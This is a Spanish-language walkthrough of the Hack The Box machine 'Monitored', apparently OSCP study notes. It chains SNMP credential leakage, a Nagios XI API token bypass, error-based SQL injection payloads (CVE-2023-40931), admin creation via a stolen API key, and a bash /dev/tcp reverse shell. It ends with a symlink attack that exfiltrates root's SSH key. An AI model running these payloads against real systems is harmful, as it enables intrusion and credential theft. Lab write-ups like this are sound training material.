---
tags:
  - env/linux
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/583
dificultad: Media
ip: 10.10.11.248
os: Linux
relacionados:
  - "[[openssl]]"
  - "[[onesixtyone]]"
  - "[[SNMP]]"
  - "[[snmpbulkwalk]]"
  - "[[UDP]]"
  - "[[API authentication token]]"
  - "[[Token-based Login]]"
  - "[[SQL Injection (SQLi)|SQLI]]"
  - "[[Error-Based SQL Injection]]"
  - "[[API Abuse for User Creation]]"
  - "[[Remote Code Execution|RCE]]"
  - "[[Symlink Race/Attack]]"
  - "[[SSH Key Exfiltration]]"
---
# HackTheBox - Monitored

## Reconocimiento

### Nmap

Un escaneo inicial con Nmap identifica múltiples servicios, incluyendo SSH, HTTP, HTTPS y LDAP. El servicio HTTP redirige a HTTPS en `https://nagios.monitored.htb`. Para facilitar el acceso, añado el dominio a nuestro archivo local `/etc/hosts`.
```bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG logs/allports
nmap -sCV -p22,80,389,443,5667 $(cat ip) -oN logs/nmap-sCV
echo "10.10.11.248 nagios.monitored.htb" | sudo tee -a /etc/hosts
```

Al acceder al host virtual, confirmo que se está utilizando la herramienta de monitoreo de red Nagios.

### Escaneo UDP

Como no tengo credenciales ni conozco la versión de NagiosXI, vuelvo a escanear puertos, esta vez probando los puertos UDP.
```bash
sudo nmap -sU --top-ports 10 -sV 10.129.230.96
```

Veo que los puertos **123 (NTP)** y **161 (SNMP)** están abiertos. El puerto 161 es especialmente interesante, ya que expone SNMP.

### Listar información de SNMP

1. Con `onesixtyone` busco la community string requerida para luego usar `snmpbulkwalk`:
```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $(cat ip)
```

2. Ejecuto `snmphulkwalk` para ver si puedo extraer información útil del objetivo.
```bash
snmpbulkwalk -v2c -c public 10.10.11.248 -m all | tee logs/snmp.out
```
  * `-v2c`: Indica a `snmpwalk` que use la versión 2c de SNMP.
  * `-c public`: Utiliza "public" como la *community string*, que es la cadena de acceso por defecto para operaciones de solo lectura en muchas configuraciones.

El comando se ejecuta por un tiempo y, entre toda la salida, encontró un conjunto de credenciales que se utilizan en un script de bash en el sistema objetivo: **`svc:XjH7VCehowpR1xZB`**.

Intento autenticarme en la interfaz web con estas credenciales, pero recibo un error indicando que la cuenta está deshabilitada.


-----

## Intrusión y Acceso Inicial

### Omitiendo Restricciones de Cuenta Deshabilitada

Tengo credenciales, pero no puedo acceder a la interfaz web porque la cuenta `svc` está deshabilitada. Investigando sobre Nagios, encuentro una publicación en los foros de Nagios que proporciona un método para usar la API del servicio y obtener un token de sesión, incluso para cuentas deshabilitadas.

https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567

El comando de ejemplo es:
```bash
curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin&password=YOURPASS&valid_min=5'
```

Intento realizar la misma solicitud con las credenciales que descubrí:
```bash
curl -s -XPOST -k 'https://nagios.monitored.htb/nagiosxi/api/v1//authenticate' -d 'username=svc&password=XjH7VCehowpR1xZB' | jq
```

¡Éxito\! 🎉 Obtengo un token de autenticación para el usuario `svc`. La misma publicación del foro muestra cómo usar este token para acceder directamente a una página:
```http
https://nagios.monitored.htb/nagiosxi/login.php?token=<TOKEN>
```
Logro acceder al dashboard de Nagios.

>[!IMPORTANT] Usuario con privilegios limitados
>El usuario `svc` no tiene privilegios de administrador en la web

### Inyección SQL en Banners de Anuncios (CVE-2023-40931)

Una vez dentro, el pie de página del sitio revela la versión: **Nagios XI 5.11.0**. Ahora que conozco la versión del servicio y estoy autenticado, puedo buscar exploits específicos. Encuentro una publicación de Outpost24 que detalla cuatro vulnerabilidades en versiones de Nagios 5.11.1 y anteriores. Una de ellas es una inyección SQL.

>[!BUG] **Descripción de la Vulnerabilidad:**
> Nagios XI tiene una función de "Banners de Anuncios" que los usuarios pueden marcar como leídos. El endpoint para esta función, `banner_message-ajaxhelper.php`, es vulnerable a una inyección SQL. Cuando un usuario confirma un banner, se envía una solicitud POST con `action=acknowledge_banner_message&id=3`. El parámetro `id` no está sanitizado correctamente, lo que permite a un atacante autenticado (incluso con bajos privilegios) ejecutar consultas SQL para extraer datos sensibles de tablas como `xi_session` y `xi_users`, que contienen correos, nombres de usuario, hashes de contraseñas y claves API.

Para confirmar la vulnerabilidad, arranco Burp Suite, actualizo la página, capturo la solicitud, la envio al `Repeater` y cambio el tipo a `POST`. Intento enviar la siguiente petición, reemplazando el valor de la cookie con mi cookie de sesión y usando `*` en el parámetro `id`:
```http
https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php
```

```http
POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=dms0hqea5k56g513str10u1uq2
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cache-Control: max-age=0
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

action=acknowledge_banner_message&id=*
```
En la respuesta, veo un error de SQL, lo que confirma que el parámetro es inyectable. 

#### Opción 1: Automatizado con `sqlmap`

Uso `sqlmap` para automatizar el proceso y enumerar la base de datos.
```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=COOKIE" --dbs --threads=10
```

`sqlmap` confirma que el DBMS es **MySQL** y encuentra dos bases de datos: `information_schema` y `nagiosxi`. Nos centro en `nagiosxi` y listo sus tablas.
```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=COOKIE" --threads=10 -D nagiosxi --tables
```

Entre las 22 tablas, `xi_users` parece la más prometedora. Procedo a volcar su contenido.
```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=COOKIE" --threads=10 -D nagiosxi -T xi_users --dump
```

La tabla contiene nombres de usuario, correos, hashes de contraseñas (que no logro crackear) y, lo más importante, **claves API**. Obtengo la clave API del usuario `nagiosadmin`. 
```
+-------------+------------------------------------------------------------------+
| username    | api_key                                                          |
+-------------+------------------------------------------------------------------+
| nagiosadmin | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL   |
| svc         | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK   |
+-------------+------------------------------------------------------------------+
```

#### Opción 2: Inyección SQL manual (based error)

1. **Entendiendo como funciona la vulnerabilidad**
Haciendo pruebas con el payload en cuestión veo que no parece que el numero `3` esté entre `''`, por lo que debo ejecutar las inyecciones considerando eso. 
```sql
action=acknowledge_banner_message&id=3' -- -
```
Esto da un error que da a entender que no toma la consulta. 
```
action=acknowledge_banner_message&id=3 -- -
```
Esto da otro tipo de error, pero parece tomar la consulta.

Lo siguiente es confirmar que la función `extractvalue` puede ser utilizada para generar un error y mostrar información sensible.

2. **Obtener la Versión de la Base de Datos**
Inyecto una consulta que pide la versión de la base de datos. Si el servidor devuelve un error que contiene el número de la versión, la vulnerabilidad está confirmada.
```sql
action=acknowledge_banner_message&id=3 and extractvalue(1, version())-- -
```

> [!ERROR] **Error Esperado (Ejemplo):**
> `XPATH syntax error: '.10.4.14-MariaDB'`
> El texto después del `:` es el resultado de la consulta (`version()`).

3. **Obtener el Nombre de la Base de Datos Actual**
De forma similar, puedo obtener el nombre de la base de datos en uso.
```sql
action=acknowledge_banner_message&id=3 and extractvalue(1, database())-- -
```

> [!ERROR] **Error Esperado (Ejemplo):**
> `XPATH syntax error: 'nagiosxi'`

> [!tip] **Solucionando Problemas de Visualización**
> A veces, el error no muestra el resultado de la consulta porque el XPath no comienza con un carácter válido (como `/`). Para forzar la visualización, se puede concatenar un carácter de nueva línea (`0x0a`) al principio de la subconsulta.
> ```sql
> action=acknowledge_banner_message&id=3 and extractvalue(1, concat(0x0a, database())-- -
> ```

4. **Listar todos los Esquemas (Bases de Datos)**
La tabla `information_schema.schemata` contiene los nombres de todas las bases de datos.
```sql
action=acknowledge_banner_message&id=3 and extractvalue(1, concat(0x0a,(select schema_name from information_schema.schemata)))-- -
```

> [!warning] **Error: Subquery returns more than 1 row**
> Este error ocurre porque la consulta devuelve múltiples nombres de bases de datos, y `extractvalue` solo puede manejar un resultado a la vez.

Para solucionarlo, puedo usar `group_concat()` para unir todos los resultados en una sola línea, o `LIMIT` para extraerlos uno por uno.

```sql
-- Usando group_concat para ver todos los esquemas
action=acknowledge_banner_message&id=3 and extractvalue(1, concat(0x0a,(select group_concat(schema_name)from information_schema.schemata)))-- -

-- Usando LIMIT para ver un esquema a la vez (cambiando el offset)
action=acknowledge_banner_message&id=3 and extractvalue(1, concat(0x0a,(select schema_name from information_schema.schemata limit 0,1)))-- -
```

5. **Listar Tablas**
```sql
action=acknowledge_banner_message&id=3 and extractvalue(1, concat(0x0a,(select table_name from information_schema.tables where table_schema='nagiosxi' limit 0,1)))-- -
```

6. **Listar Columnas**
**Payload:**
```sql
action=acknowledge_banner_message&id=3 and extractvalue(1, concat(0x0a,(select column_name from information_schema.columns where table_schema='nagiosxi' and table_name='xi_users' limit 0,1)))-- -
```

7. **Extraer el Contenido de una Columna**
Uso una consulta para seleccionar el dato que deseo.
```sql
action=acknowledge_banner_message&id=3 and extractvalue(1, concat(0x0a,(select api_key from nagiosxi.xi_users limit 0,1)))-- -
```

> [!note] **Manejo de Datos Largos con `substring`**
> Los mensajes de error suelen tener un límite de caracteres (ej. 32 o 64). Si el dato que queremos extraer (como una API key) es más largo, no se mostrará completo. Para solucionarlo, usamos la función `substring()` para extraer el dato en fragmentos.

8. **Extracción por Fragmentos**
Me desplazo por la cadena de la `api_key` cambiando el punto de inicio en `substring(string, inicio, longitud)`.
*Primeros 20 caracteres:*
```sql
action=acknowledge_banner_message&id=3 and extractvalue(1, concat(0x0a,(select substring(api_key,1,20) from nagiosxi.xi_users limit 0,1)))-- -
```
*Caracteres del 21 al 40:*
```sql
action=acknowledge_banner_message&id=3 and extractvalue(1, concat(0x0a,(select substring(api_key,21,20) from nagiosxi.xi_users limit 20,1)))-- -
```
*Caracteres del 41 en adelante:*
```sql
action=acknowledge_banner_message&id=3 and extractvalue(1, concat(0x0a,(select substring(api_key,41,20) from nagiosxi.xi_users limit 40,1)))-- -
```
Se repite este proceso hasta haber extraído la cadena completa.

>[!SUCCESS] API importante encontrada
>IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL

### Creación de Usuario Administrador y RCE

Con la clave API del administrador, puedo usar la API para crear un nuevo usuario con privilegios de administrador, como se muestra en un exploit más antiguo.
```bash
curl -s -XPOST -k 'https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL' -d 'username=v&password=123456&name=v&email=v@v.com&auth_level=admin' | jq
```
Ahora puedo iniciar sesión con el usuario `v:123456` y tendré privilegios de administrador.

Para obtener ejecución de comandos (RCE), sigo estos pasos:

1.  Voy a **Configure \> Core Config Manager \> Commands**.
2.  Creo un nuevo comando llamado `ashell` con el siguiente payload, que me enviará una reverse shell.
    ```bash
    /bin/bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'
    ```
3.  Hago clic en **Save** y luego en **Apply Configuration**.
4.  En mi máquina, pongo un listener de Netcat para recibir la conexión.
    ```bash
    nc -lvvp 4444
    ```
5.  Finalmente, voy a **Monitoring \> Hosts**, hago clic en **localhost**, selecciono `ashell` como **Check Command** y hago clic en **Run check command**.

Recibo una conexión en mi listener y obtengo una shell como el usuario `nagios`. 

La bandera de usuario se encuentra en `/home/nagios/user.txt`.


-----

## Escalada de Privilegios

### Enumeración Sudo y Análisis del Script

Al revisar los privilegios con `sudo -l`, veo que puedo ejecutar un script específico como `root`.

```bash
sudo -l
# User nagios may run the following commands on monitored:
# (ALL) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
```

Analizo el código fuente de `getprofile.sh`. Parte de su funcionalidad es recolectar varios logs y archivos de configuración en un directorio de perfil especificado por el usuario. El script toma un argumento en la línea de comandos, que es el nombre del directorio donde se guardará el perfil.

```bash
#!/bin/bash
# GRAB THE ID
folder=$1
if [ "$folder" == "" ]; then
    echo "You must enter a folder name/id to generate a profile."
    echo "Example: ./getprofile.sh <id>"
    exit 1
fi
<SNIP>
echo "Getting phpmailer.log..."
if [ -f /usr/local/nagiosxi/tmp/phpmailer.log ]; then
    tail -100 /usr/local/nagiosxi/tmp/phpmailer.log > "/usr/local/nagiosxi/var/components/profile/$folder/phpmailer.log"
fi
<SNIP>
```

El script comprueba si `phpmailer.log` existe en `/usr/local/nagiosxi/tmp/` y, si es así, copia sus últimas 100 líneas al directorio de perfil. La vulnerabilidad reside en que el script **no valida ni sanea la ruta del archivo de log**. Puedo controlar el contenido de `/usr/local/nagiosxi/tmp/phpmailer.log` porque tengo permisos de escritura en el directorio `/usr/local/nagiosxi/tmp/`.

Esto abre la puerta a un ataque de **enlace simbólico (symlink)**. Puedo crear un enlace simbólico llamado `phpmailer.log` que apunte a un archivo sensible (por ejemplo, `/root/.ssh/id_rsa`). Cuando el script se ejecute con `sudo`, seguirá el enlace y copiará el contenido del archivo sensible a un directorio al que sí tengo acceso.

Verifico la configuración SSH del servidor para ver si la autenticación como `root` está permitida.
```bash
cat /etc/ssh/sshd_config | grep -E 'PermitRootLogin|PubkeyAuthentication'
# PermitRootLogin prohibit-password
# PubkeyAuthentication yes
```

La configuración `PermitRootLogin prohibit-password` significa que no se puede iniciar sesión como `root` con contraseña, pero sí con una clave SSH.

### Explotación de la Vulnerabilidad

Para explotar esta vulnerabilidad, seguimos estos pasos:

1.  **Crear el enlace simbólico**: Creo un symlink llamado `phpmailer.log` en el directorio `/usr/local/nagiosxi/tmp/` que apunte a la clave privada SSH del usuario `root`.
    ```bash
    ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
    ```

2.  **Ejecutar el script vulnerable**: Ejecuto `getprofile.sh` con `sudo`, pasando un nombre de carpeta arbitrario (por ejemplo, `1`).
    ```bash
    sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
    ```
    El script seguirá el symlink y copiará el contenido de `/root/.ssh/id_rsa` a `/usr/local/nagiosxi/var/components/profile/1/phpmailer.log`.

3.  **Acceder a los datos copiados**: El script también genera un archivo `.zip` con el perfil. Lo copio, lo descomprimo y leo el archivo para obtener la clave.

La secuencia completa de comandos es la siguiente:
```bash
# Crear el enlace simbólico
ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log

# Ejecutar el script con sudo
sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1

# Copiar el perfil generado, descomprimirlo y leer la clave
cp /usr/local/nagiosxi/var/components/profile.zip /tmp/
cd /tmp
unzip profile.zip
cat profile-1/phpmailer.log
```

El archivo `phpmailer.log` ahora contiene la clave SSH privada de `root`. La guardo localmente en mi máquina, le doy los permisos correctos (`600`) y la uso para autenticarme como `root`.

```bash
# En nuestra máquina local
chmod 600 id_rsa_root
ssh root@nagios.monitored.htb -i id_rsa_root
```

Con esto, obtenego acceso como `root` y puedo leer la bandera final en `/root/root.txt`. 🚩


___

## Bandera(s)

> [!flag] `flag{user}`
> 26ca36f5d5f8d8e87f68c187c69d61b1
^bandera-user

> [!flag] `flag{root}`
> 3c2c167373f3835145a261924ab15ba9
^bandera-root
